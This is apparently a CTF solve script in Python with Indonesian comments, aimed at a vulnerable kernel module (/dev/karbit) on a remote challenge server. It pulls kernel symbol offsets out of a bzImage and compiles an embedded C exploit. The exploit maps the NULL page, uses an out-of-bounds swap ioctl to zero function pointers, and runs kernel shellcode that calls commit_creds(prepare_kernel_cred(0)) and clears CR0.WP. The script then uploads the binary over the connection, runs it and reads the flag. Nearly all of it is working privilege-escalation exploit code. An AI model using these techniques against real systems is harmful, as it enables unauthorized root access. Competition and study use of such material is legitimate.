#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import os, sys, base64, textwrap, subprocess, tempfile, re, zlib, struct

HOST_DEFAULT = "gzcli.techcomfest.1pc.tf"
PORT_DEFAULT = 54883

FLAG_RE = re.compile(rb"TCF\{[^}\n]+\}")

# ------------------------------------------------------------
# Optional: auto-extract commit_creds / prepare_kernel_cred offsets from bzImage
# (kalo file bzImage ada di folder yang sama / kamu kasih path-nya)
# ------------------------------------------------------------

ELF_HDR_FMT = "<16sHHIQQQIHHHHHH"
SHDR_FMT    = "<IIQQQQIIQQ"

def _parse_elf_sections(elf_bytes: bytes):
    if elf_bytes[:4] != b"\x7fELF":
        raise ValueError("Not an ELF")

    e = struct.unpack(ELF_HDR_FMT, elf_bytes[:64])
    e_ident = e[0]
    if e_ident[4] != 2 or e_ident[5] != 1:
        raise ValueError("Need ELF64 little-endian")

    e_shoff     = e[6]
    e_shentsize = e[11]
    e_shnum     = e[12]
    e_shstrndx  = e[13]

    shdrs = []
    off = e_shoff
    for _ in range(e_shnum):
        sh = struct.unpack(SHDR_FMT, elf_bytes[off:off+e_shentsize])
        shdrs.append(sh)
        off += e_shentsize

    shstr = shdrs[e_shstrndx]
    shstr_off  = shstr[4]
    shstr_size = shstr[5]
    shstrtab = elf_bytes[shstr_off:shstr_off+shstr_size]

    def sec_name(sh):
        n_off = sh[0]
        end = shstrtab.find(b"\x00", n_off)
        return shstrtab[n_off:end].decode(errors="ignore")

    secs = {}
    for sh in shdrs:
        name = sec_name(sh)
        secs[name] = {
            "addr":  sh[3],
            "off":   sh[4],
            "size":  sh[5],
            "align": sh[8],
        }
    return secs

def extract_offsets_from_bzimage(bz_path: str):
    data = open(bz_path, "rb").read()
    gz_magic = b"\x1f\x8b\x08"
    off = data.find(gz_magic)
    if off < 0:
        raise RuntimeError("gzip magic not found in bzImage")

    blob = data[off:]
    d = zlib.decompressobj(16 + zlib.MAX_WBITS)   # gzip wrapper
    vmlinux = d.decompress(blob)

    secs = _parse_elf_sections(vmlinux)

    text = secs.get(".text")
    ks   = secs.get("__ksymtab")
    ksg  = secs.get("__ksymtab_gpl")
    kstr = secs.get("__ksymtab_strings")
    if not (text and ks and kstr):
        raise RuntimeError("needed sections missing (text/ksymtab/kstr)")

    text_addr = text["addr"]
    str_addr  = kstr["addr"]
    str_off   = kstr["off"]
    str_size  = kstr["size"]

    def read_cstr_at_va(va: int) -> str:
        if not (str_addr <= va < str_addr + str_size):
            return ""
        fo = str_off + (va - str_addr)
        end = vmlinux.find(b"\x00", fo)
        if end < 0:
            return ""
        return vmlinux[fo:end].decode(errors="ignore")

    def scan_ksymtab(sec):
        if not sec:
            return {}
        base_addr = sec["addr"]
        base_off  = sec["off"]
        size      = sec["size"]
        out = {}
        for i in range(0, size, 12):  # struct kernel_symbol (prel32) => 3x s32
            chunk = vmlinux[base_off+i:base_off+i+12]
            if len(chunk) < 12:
                break
            val_off, name_offs, _ = struct.unpack("<iii", chunk)
            entry_addr = base_addr + i
            sym_addr = (entry_addr + 0) + val_off
            name_ptr = (entry_addr + 4) + name_offs
            name = read_cstr_at_va(name_ptr)
            if name:
                out[name] = sym_addr
        return out

    sym = {}
    sym.update(scan_ksymtab(ks))
    sym.update(scan_ksymtab(ksg))

    commit = sym.get("commit_creds")
    prep   = sym.get("prepare_kernel_cred")
    if not commit or not prep:
        raise RuntimeError("commit_creds / prepare_kernel_cred not found in __ksymtab")

    return (commit - text_addr, prep - text_addr)

# ------------------------------------------------------------
# Exploit C template (null-deref jump via _set_rw/_set_ro/ptr_key = 0)
# ------------------------------------------------------------

C_TEMPLATE = r"""
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define IOCTL_SWAP 0xdead
#define IOCTL_BEEF 0xbeef

struct swap_req {{
    uint64_t i1;
    uint64_t i2;
}};

extern char shellcode_start[], shellcode_end[];

static void xswap(int fd, uint64_t i1, uint64_t i2) {{
    struct swap_req r = {{ .i1 = i1, .i2 = i2 }};
    if (ioctl(fd, IOCTL_SWAP, &r) != 0) {{
        perror("ioctl(0xdead)");
        exit(1);
    }}
}}

static void dump_flag(void) {{
    const char *paths[] = {{
        "/flag",
        "/root/flag",
        "/home/karbiter/flag",
        "/home/karbiter/flag.txt",
        NULL
    }};
    for (int i=0; paths[i]; i++) {{
        int fd = open(paths[i], O_RDONLY);
        if (fd < 0) continue;
        char buf[512] = {{0}};
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {{
            write(1, buf, (size_t)n);
            return;
        }}
    }}
    puts("[-] flag file not found (coba: find / -name '*flag*' 2>/dev/null)");
}}

int main(void) {{
    setbuf(stdout, NULL);

    // map NULL page (butuh mmap_min_addr=0 di chall ini)
    void *p = mmap((void*)0x0, 0x1000,
                   PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (p == MAP_FAILED) {{
        perror("mmap(0)");
        puts("[-] mmap NULL gagal. Kemungkinan vm.mmap_min_addr != 0.");
        return 1;
    }}

    // copy payload ke address 0
    size_t sc_sz = (size_t)(shellcode_end - shellcode_start);
    memcpy((void*)0x0, shellcode_start, sc_sz);

    int fd = open("/dev/karbit", O_RDONLY);
    if (fd < 0) {{
        perror("open(/dev/karbit)");
        return 1;
    }}

    // 1) naikin tries: waifu_set_try ada di waifu_list[-8]
    xswap(fd, 0, (uint64_t)-8);

    // 2) ptr_key = 0  (ptr_key ada di waifu_list[-2])
    xswap(fd, 1, 8);                 // ambil 0 dari area kosong
    xswap(fd, 1, (uint64_t)-2);      // ptr_key <- 0

    // 3) _set_rw = 0  (_set_rw ada di waifu_list[-3])
    xswap(fd, 2, 9);
    xswap(fd, 2, (uint64_t)-3);

    // 4) _set_ro = 0  (_set_ro ada di waifu_list[-4])
    xswap(fd, 3, 10);
    xswap(fd, 3, (uint64_t)-4);

    // trigger: patch obj_karbit byte jadi RET (0xC3)
    if (ioctl(fd, IOCTL_BEEF, 0xc3) != 0) {{
        perror("ioctl(0xbeef)");
        return 1;
    }}

    if (getuid() == 0) {{
        puts("[+] root!");
        dump_flag();
        return 0;
    }}

    printf("[-] no root, uid=%d\n", getuid());
    return 1;
}}

// ----------------------------------------------------------
// Shellcode kernel-mode @ address 0
// - find kernel base by scanning for .text signature
// - commit_creds(prepare_kernel_cred(0))
// - clear WP on first call, restore WP on second call
// ----------------------------------------------------------
__asm__(
".intel_syntax noprefix\n"
".global shellcode_start\n"
".global shellcode_end\n"
"shellcode_start:\n"
"  endbr64\n"
"  push rbp\n"
"  push rbx\n"
"  push r12\n"
"  push r13\n"
"  push r14\n"
"  push r15\n"

"  lea rbx, [rip+state]\n"
"  mov rax, [rbx]\n"
"  cmp rax, 0\n"
"  jne sc_second\n"

"  // --- first call: become root + clear WP ---\n"
"  mov ecx, 0xC0000082\n"          // MSR_LSTAR
"  rdmsr\n"
"  shl rdx, 32\n"
"  or  rax, rdx\n"
"  and rax, 0xffffffffffe00000\n"  // 2MB align
"  mov r12, rax\n"

"  mov r13, 0x4101e9e8ae0f9066\n"  // 66 90 0f ae e8 e9 01 41
"  mov r14, 0xcccccccccccc0010\n"  // 10 00 cc cc cc cc cc cc

"find_base:\n"
"  cmp qword ptr [r12], r13\n"
"  jne next_base\n"
"  cmp qword ptr [r12+8], r14\n"
"  jne next_base\n"
"  mov r15, r12\n"
"  jmp got_base\n"
"next_base:\n"
"  sub r12, 0x200000\n"
"  jmp find_base\n"

"got_base:\n"
"  // prepare_kernel_cred(0)\n"
"  mov rax, r15\n"
"  add rax, {PREPARE_OFF}\n"
"  xor rdi, rdi\n"
"  call rax\n"
"  // commit_creds(cred)\n"
"  mov rdi, rax\n"
"  mov rax, r15\n"
"  add rax, {COMMIT_OFF}\n"
"  call rax\n"

"  mov qword ptr [rbx], 1\n"

"  // clear CR0.WP (bit 16)\n"
"  mov rax, cr0\n"
"  and rax, 0xfffffffffffeffff\n"
"  mov cr0, rax\n"
"  jmp sc_ret\n"

"sc_second:\n"
"  cmp rax, 1\n"
"  jne sc_ret\n"
"  // second call: restore WP\n"
"  mov rax, cr0\n"
"  or  rax, 0x10000\n"
"  mov cr0, rax\n"
"  mov qword ptr [rbx], 2\n"

"sc_ret:\n"
"  xor rax, rax\n"
"  pop r15\n"
"  pop r14\n"
"  pop r13\n"
"  pop r12\n"
"  pop rbx\n"
"  pop rbp\n"
"  ret\n"

"state:\n"
"  .quad 0\n"
"shellcode_end:\n"
".att_syntax prefix\n"
);
"""

def build_exploit(commit_off: int, prepare_off: int) -> bytes:
    c_src = C_TEMPLATE.format(
        COMMIT_OFF=f"0x{commit_off:x}",
        PREPARE_OFF=f"0x{prepare_off:x}",
    )

    with tempfile.TemporaryDirectory() as td:
        cpath = os.path.join(td, "exp.c")
        bpath = os.path.join(td, "exp")
        with open(cpath, "w") as f:
            f.write(c_src)

        cc = os.environ.get("CC", "gcc")
        cmd = [cc, cpath, "-O2", "-s", "-no-pie", "-static", "-o", bpath]

        try:
            subprocess.check_call(cmd)
        except Exception:
            # fallback: coba tanpa -static (kadang env user gak punya static libc)
            log.failure("Compile static gagal. Coba fallback compile dynamic...")
            cmd = [cc, cpath, "-O2", "-s", "-no-pie", "-o", bpath]
            subprocess.check_call(cmd)

        return open(bpath, "rb").read()

def ensure_shell(io) -> None:
    # kalau nyangkut di mykarbit, Ctrl-C biasanya bikin balik ke /init lalu su -> shell
    for _ in range(6):
        io.send(b"\x03")  # Ctrl-C
        io.sendline(b"echo __SHELL__")
        data = io.recvrepeat(0.8)
        if b"__SHELL__" in data:
            return
    # last try: spam newline
    for _ in range(6):
        io.sendline(b"echo __SHELL__")
        data = io.recvrepeat(0.8)
        if b"__SHELL__" in data:
            return
    log.warning("Gagal memastikan shell prompt, tapi lanjut upload aja (kadang prompt ga keliatan).")

def upload_and_run(io, blob: bytes) -> bytes:
    b64 = base64.b64encode(blob).decode()
    lines = textwrap.wrap(b64, 512)  # jangan kepanjangan per line

    io.sendline(b"cd /tmp")
    io.sendline(b"cat > exp.b64 <<'EOF'")
    for ln in lines:
        io.sendline(ln.encode())
    io.sendline(b"EOF")
    io.sendline(b"base64 -d exp.b64 > exp")
    io.sendline(b"chmod +x exp")
    io.sendline(b"./exp")
    io.sendline(b"echo __DONE__")

    out = io.recvuntil(b"__DONE__", timeout=10)
    return out

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else HOST_DEFAULT
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT_DEFAULT

    # default offsets (buat kernel bundle ini)
    commit_off  = 0x2c9a30
    prepare_off = 0x2c9cc0

    # auto-extract kalau bzImage ada
    bz_candidates = [
        "./bzImage",
        "./chal/bzImage",
        os.environ.get("BZIMAGE", ""),
    ]
    for bz in bz_candidates:
        if bz and os.path.exists(bz):
            try:
                log.info(f"Auto-extract offsets dari {bz} ...")
                commit_off, prepare_off = extract_offsets_from_bzimage(bz)
                log.success(f"commit_creds off  = 0x{commit_off:x}")
                log.success(f"prepare off       = 0x{prepare_off:x}")
                break
            except Exception as e:
                log.warning(f"extract offsets gagal: {e} (pake hardcode)")

    log.info("Build exploit ...")
    exp = build_exploit(commit_off, prepare_off)
    log.success(f"exploit size: {len(exp)} bytes")

    io = remote(host, port)
    io.recvrepeat(0.5)
    ensure_shell(io)

    log.info("Upload & run ...")
    out = upload_and_run(io, exp)

    m = FLAG_RE.search(out)
    if m:
        log.success("FLAG: " + m.group(0).decode())
        print(m.group(0).decode())
    else:
        log.failure("Flag belum ketemu di output. Ini outputnya:\n" + out.decode(errors="ignore"))
        # biar kamu bisa manual
        io.interactive()

if __name__ == "__main__":
    context.log_level = "info"
    main()
